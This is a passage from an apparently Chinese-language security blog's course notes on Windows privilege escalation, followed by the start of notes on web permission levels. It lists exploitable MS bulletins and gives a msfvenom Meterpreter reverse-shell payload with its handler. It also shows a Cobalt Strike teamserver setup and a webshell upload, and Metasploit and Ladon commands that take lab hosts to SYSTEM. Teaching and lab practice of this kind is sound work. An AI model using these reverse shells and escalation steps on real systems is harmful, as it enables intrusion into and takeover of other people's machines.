(2003)</p><p>MS14-068 　[KB3011780] [域权限提升] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-058 　[KB3000061] [Win32k.sys] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-066 　[KB2992611] [Windows Schannel 允许远程代码执行] (VistaSP2&#x2F;7 SP1&#x2F;8&#x2F;Windows 8.1&#x2F;2003 SP2&#x2F;2008 SP2&#x2F;2008 R2 SP1&#x2F;2012&#x2F;2012 R2&#x2F;Windows RT&#x2F;Windows RT 8.1)</p><p>MS14-040 　[KB2975684] [AFD 驱动程序] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-002 　[KB2914368] [NDProxy] (2003&#x2F;XP)</p><p>MS13-053 　[KB2850851] [win32k.sys] (XP&#x2F;Vista&#x2F;2003&#x2F;2008&#x2F;win 7)</p><p>MS13-046 　[KB2840221] [dxgkrnl.sys] (Vista&#x2F;2003&#x2F;2008&#x2F;2012&#x2F;7)</p><p>MS13-005 　[KB2778930] [内核模式驱动程序] (2003&#x2F;2008&#x2F;2012&#x2F;win7&#x2F;8)</p><p>MS12-042 　[KB2972621] [服务总线] (2008&#x2F;2012&#x2F;win7)</p><p>MS12-020 　[KB2671387] [RDP] (2003&#x2F;2008&#x2F;7&#x2F;XP)</p><p>MS11-080 　[KB2592799] [AFD.sys] (2003&#x2F;XP)</p><p>MS11-062 　[KB2566454] [NDISTAPI] (2003&#x2F;XP)</p><p>MS11-046 　[KB2503665] [AFD.sys] (2003&#x2F;2008&#x2F;7&#x2F;XP)</p><p>MS11-011 　[KB2393802] [内核驱动程序] (2003&#x2F;2008&#x2F;7&#x2F;XP&#x2F;Vista)</p><p>MS10-092 　[KB2305420] [任务计划程序] (2008&#x2F;7)</p><p>MS10-065 　[KB2267960] [FastCGI]（IIS 5.1、6.0、7.0 和 7.5）</p><p>MS10-059 　[KB982799] [ACL-Churraskito] (2008&#x2F;7&#x2F;Vista)</p><p>MS10-048 　[KB2160329] [win32k.sys] (XP SP2 &amp; SP3&#x2F;2003 SP2&#x2F;Vista SP1 &amp; SP2&#x2F;2008 Gold &amp; SP2 &amp; R2&#x2F;Win7)</p><p>MS10-015 　[KB977165] [KiTrap0D] (2003&#x2F;2008&#x2F;7&#x2F;XP)</p><p>MS10-012 　[KB971468] [SMB 客户端 Trans2 堆栈溢出] (Windows 7&#x2F;2008R2)</p><p>MS09-050 　[KB975517] [远程代码执行] (2008&#x2F;Vista)</p><p>MS09-020 　[KB970483] [IIS 6.0]（IIS 5.1 和 6.0）</p><p>MS09-012 　[KB959454] [Chimichurri] (Vista&#x2F;win7&#x2F;2008&#x2F;Vista)</p><p>MS08-068 　[KB957097] [远程代码执行] (2000&#x2F;XP)</p><p>MS08-067 　[KB958644] [远程代码执行] (Windows 2000&#x2F;XP&#x2F;Server 2003&#x2F;Vista&#x2F;Server 2008)</p><p>MS08-066 　[KB956803] [AFD.sys] (Windows 2000&#x2F;XP&#x2F;Server 2003)</p><p>MS08-025 　[KB941693] [Win32.sys] (XP&#x2F;2003&#x2F;2008&#x2F;Vista)</p><p>MS06-040 　[KB921883] [远程代码执行] (2003&#x2F;xp&#x2F;2000)</p><p>MS05-039 　[KB899588] [PnP 服务] (Win 9X&#x2F;ME&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;2003)</p><p>MS03-026 　[KB823980] [RPC接口中的缓冲区溢出]（&#x2F; NT &#x2F; 2000 &#x2F; XP &#x2F; 2003）</p><p><strong>用tasklist &#x2F;svc查看进程有什么杀软</strong></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144715602.png" alt="image-20230418144715602"></p><h3 id="Web-amp-Windows-人工手动-筛选-amp-下载-amp-利用"><a href="#Web-amp-Windows-人工手动-筛选-amp-下载-amp-利用" class="headerlink" title="#Web&amp;Windows-人工手动-筛选&amp;下载&amp;利用"></a>#Web&amp;Windows-人工手动-筛选&amp;下载&amp;利用</h3><p><code>如果提权中无法执行命令的话，可以尝试上传cmd.exe到可读写目录再调用执行</code></p><h5 id="1、脚本项目筛选：补丁-amp-系统-amp-漏洞等"><a href="#1、脚本项目筛选：补丁-amp-系统-amp-漏洞等" class="headerlink" title="1、脚本项目筛选：补丁&amp;系统&amp;漏洞等"></a>1、脚本项目筛选：补丁&amp;系统&amp;漏洞等</h5><p><strong>Vulmap</strong>：<a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418145244769.png" alt="image-20230418145244769"></p><p><strong>wesng</strong>：<a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144848583.png" alt="image-20230418144848583"></p><p><strong>WindowsVulnScan</strong>：<a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144917213.png" alt="image-20230418144917213"></p><h5 id="1-1、网站平台筛选：补丁-amp-系统-amp-漏洞等"><a href="#1-1、网站平台筛选：补丁-amp-系统-amp-漏洞等" class="headerlink" title="1.1、网站平台筛选：补丁&amp;系统&amp;漏洞等"></a>1.1、网站平台筛选：补丁&amp;系统&amp;漏洞等</h5><p><a href="https://i.hacking8.com/tiquan%EF%BC%8C%E5%B0%86systeminfo%E7%9A%84%E4%BF%A1%E6%81%AF%E5%A4%8D%E5%88%B6%E4%B8%8B%E6%9D%A5">https://i.hacking8.com/tiquan，将systeminfo的信息复制下来</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418145803365.png" alt="image-20230418145803365"></p><h5 id="2、漏洞EXP下载执行："><a href="#2、漏洞EXP下载执行：" class="headerlink" title="2、漏洞EXP下载执行："></a>2、漏洞EXP下载执行：</h5><p><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><a href="https://github.com/Ascotbe/KernelHub">https://github.com/Ascotbe/KernelHub</a></p><p><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></p><p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><p><a href="http://cve.mitre.org/data/refs/refmap/source-MS.html">http://cve.mitre.org/data/refs/refmap/source-MS.html</a></p><h5 id="说明：通过对应补丁漏洞编号寻可利用EXP"><a href="#说明：通过对应补丁漏洞编号寻可利用EXP" class="headerlink" title="说明：通过对应补丁漏洞编号寻可利用EXP"></a>说明：通过对应补丁漏洞编号寻可利用EXP</h5><p>MS&amp;CVE 关系区别&amp;对应反查</p><p>KernelHub 针对常用溢出编号指定找EXP</p><p>Poc-in-Github 针对年份及编号指定找EXP</p><p>exploitdb 针对类型及关键说明指定找EXP</p><h5 id="3、上传EXP调用执行"><a href="#3、上传EXP调用执行" class="headerlink" title="3、上传EXP调用执行"></a>3、上传EXP调用执行</h5><p>这里根据筛选了补丁并根据补丁找到exp，执行了没有任何反应，但是不明所以然，手工测试比较工具还是会差点</p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418151112545.png" alt="image-20230418151112545"></p><h3 id="Web-amp-Windows-CS半自动-反弹-amp-插件-amp-利用"><a href="#Web-amp-Windows-CS半自动-反弹-amp-插件-amp-利用" class="headerlink" title="#Web&amp;Windows-CS半自动-反弹&amp;插件&amp;利用"></a>#Web&amp;Windows-CS半自动-反弹&amp;插件&amp;利用</h3><h6 id="cs登录自己的ip"><a href="#cs登录自己的ip" class="headerlink" title="cs登录自己的ip"></a>cs登录自己的ip</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418163142518.png" alt="image-20230418163142518"></p><h5 id="1、配置启动"><a href="#1、配置启动" class="headerlink" title="1、配置启动"></a>1、配置启动</h5><p>服务器启动服务端：</p><p>chmod +x teamserver</p><p>.&#x2F;teamserver IP password</p><p>客户端连接服务端：</p><p>运行cobaltstrike.bat（运行不起来请检测JDK版本）</p><h5 id="2、配置监听器生成后执行"><a href="#2、配置监听器生成后执行" class="headerlink" title="2、配置监听器生成后执行"></a>2、配置监听器生成后执行</h5><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418163454646.png" alt="image-20230418163454646"></p><h6 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418163531128.png" alt="image-20230418163531128"></p><h6 id="这里本地测试为了节约时间将回连间隔时间60s改为0s"><a href="#这里本地测试为了节约时间将回连间隔时间60s改为0s" class="headerlink" title="这里本地测试为了节约时间将回连间隔时间60s改为0s"></a>这里本地测试为了节约时间将回连间隔时间60s改为0s</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164042904.png" alt="image-20230418164042904"></p><h6 id="调用脚本"><a href="#调用脚本" class="headerlink" title="调用脚本"></a>调用脚本</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164250258.png" alt="image-20230418164250258"></p><h6 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164319449.png" alt="image-20230418164319449"></p><h5 id="3、选择提权模块调用执行"><a href="#3、选择提权模块调用执行" class="headerlink" title="3、选择提权模块调用执行"></a>3、选择提权模块调用执行</h5><h6 id="利用插件（通杀插件）"><a href="#利用插件（通杀插件）" class="headerlink" title="利用插件（通杀插件）"></a>利用插件（通杀插件）</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164934810.png" alt="image-20230418164934810"></p><h6 id="可以用命令行"><a href="#可以用命令行" class="headerlink" title="可以用命令行"></a>可以用命令行</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165529885.png" alt="image-20230418165529885"></p><h6 id="浏览文件看111-exe的路径，执行命令让其主机执行111-exe木马文件"><a href="#浏览文件看111-exe的路径，执行命令让其主机执行111-exe木马文件" class="headerlink" title="浏览文件看111.exe的路径，执行命令让其主机执行111.exe木马文件"></a>浏览文件看111.exe的路径，执行命令让其主机执行111.exe木马文件</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165725515.png" alt="image-20230418165725515"></p><h6 id="执行成功，获得system权限"><a href="#执行成功，获得system权限" class="headerlink" title="执行成功，获得system权限"></a>执行成功，获得system权限</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165807005.png" alt="image-20230418165807005"></p><h6 id="也可以利用第二个插件"><a href="#也可以利用第二个插件" class="headerlink" title="也可以利用第二个插件"></a>也可以利用第二个插件</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165132098.png" alt="image-20230418165132098"></p><h6 id="选择模块"><a href="#选择模块" class="headerlink" title="选择模块"></a>选择模块</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165206641.png" alt="image-20230418165206641"></p><h6 id="执行后返回了system权限"><a href="#执行后返回了system权限" class="headerlink" title="执行后返回了system权限"></a>执行后返回了system权限</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165252466.png" alt="image-20230418165252466"></p><h3 id="Web-amp-Windows-MSF全自动-筛选-amp-探针-amp-利用（靶机win2008、win2012）"><a href="#Web-amp-Windows-MSF全自动-筛选-amp-探针-amp-利用（靶机win2008、win2012）" class="headerlink" title="#Web&amp;Windows-MSF全自动-筛选&amp;探针&amp;利用（靶机win2008、win2012）"></a>#Web&amp;Windows-MSF全自动-筛选&amp;探针&amp;利用（靶机win2008、win2012）</h3><h5 id="1、生成反弹后门"><a href="#1、生成反弹后门" class="headerlink" title="1、生成反弹后门"></a>1、生成反弹后门</h5><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp  <strong>LHOST</strong>&#x3D;要反弹监听的自己的公网ip  <strong>LPORT</strong>&#x3D;3333 -f exe -o msf.exe</p><h5 id="2、配置监听会话"><a href="#2、配置监听会话" class="headerlink" title="2、配置监听会话"></a>2、配置监听会话</h5><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>exploit</p><h6 id="先测试win2008"><a href="#先测试win2008" class="headerlink" title="先测试win2008"></a>先测试win2008</h6><h6 id="将msf生成的msf-exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system"><a href="#将msf生成的msf-exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system" class="headerlink" title="将msf生成的msf.exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system"></a>将msf生成的msf.exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418152011261.png" alt="image-20230418152011261"></p><h5 id="2-1、筛选EXP模块"><a href="#2-1、筛选EXP模块" class="headerlink" title="2.1、筛选EXP模块"></a>2.1、筛选EXP模块</h5><p>use post&#x2F;windows&#x2F;gather&#x2F;enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）</p><p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）</p><p>set showdescription true（展示漏洞详细）</p><h5 id="如下：没有打开showdescription-时，只出现了一个，设置为true打开后出现了很多（这里显示的172-16-41-220是公网ip对应主机的内网ip，不用在意）"><a href="#如下：没有打开showdescription-时，只出现了一个，设置为true打开后出现了很多（这里显示的172-16-41-220是公网ip对应主机的内网ip，不用在意）" class="headerlink" title="如下：没有打开showdescription 时，只出现了一个，设置为true打开后出现了很多（这里显示的172.16.41.220是公网ip对应主机的内网ip，不用在意）"></a><strong>如下：没有打开showdescription 时，只出现了一个，设置为true打开后出现了很多</strong>（这里显示的172.16.41.220是公网ip对应主机的内网ip，不用在意）</h5><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418152742549.png" alt="image-20230418152742549"></p><p>这里显示NO的就不用测试了，测试YES的，这里选择ms16_075进行测试</p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418153035759.png" alt="image-20230418153035759"></p><h5 id="3、利用EXP溢出提权"><a href="#3、利用EXP溢出提权" class="headerlink" title="3、利用EXP溢出提权"></a>3、利用EXP溢出提权</h5><p>background(退出到msf6) &#x2F;&#x2F;把你当前的metasploit shell转为后台执行。</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy（复制上面的ms16_075模块）</p><p>set session 1</p><p>exploit</p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418153432703.png" alt="image-20230418153432703"></p><h6 id="run之后这里失败了，提示错误"><a href="#run之后这里失败了，提示错误" class="headerlink" title="run之后这里失败了，提示错误"></a>run之后这里失败了，提示错误</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418160012535.png" alt="image-20230418160012535"></p><h6 id="可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限"><a href="#可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限" class="headerlink" title="可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限"></a>可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418155625475.png" alt="image-20230418155625475"></p><h6 id="下面测试靶机win2012，上面的msf-exe对于2008和2012的都有效"><a href="#下面测试靶机win2012，上面的msf-exe对于2008和2012的都有效" class="headerlink" title="下面测试靶机win2012，上面的msf.exe对于2008和2012的都有效"></a>下面测试靶机win2012，上面的msf.exe对于2008和2012的都有效</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418160641548.png" alt="image-20230418160641548"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418161005935.png" alt="image-20230418161005935"></p><h3 id="Web-amp-Win16-amp-19-Ladon半自动-上传-amp-插件-amp-利用（插件使用在第一个案例）"><a href="#Web-amp-Win16-amp-19-Ladon半自动-上传-amp-插件-amp-利用（插件使用在第一个案例）" class="headerlink" title="#Web&amp;Win16&amp;19-Ladon半自动-上传&amp;插件&amp;利用（插件使用在第一个案例）"></a>#Web&amp;Win16&amp;19-Ladon半自动-上传&amp;插件&amp;利用（插件使用在第一个案例）</h3><p><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p>ladon40 badpotato whoami</p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day97 权限提升-Web权限&amp;权限划分&amp;源码后台&amp;中间件&amp;第三方&amp;数据库等</title>
      <link href="/2023/04/17/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/"/>
      <url>/2023/04/17/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/Xyd9L5Iuysd2ZLwVhivGlQ.png" alt="img"></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230423161754972.png" alt="image-20230423161754972"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、前面-中期-后期对应知识关系</p><p>2、明确当前权限常见的获取方式</p><p>3、明确当前权限对应可操作事情</p><p>4、后台权限提升网站权限常规操作</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h4><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h4 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h4><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h4 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h4><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" 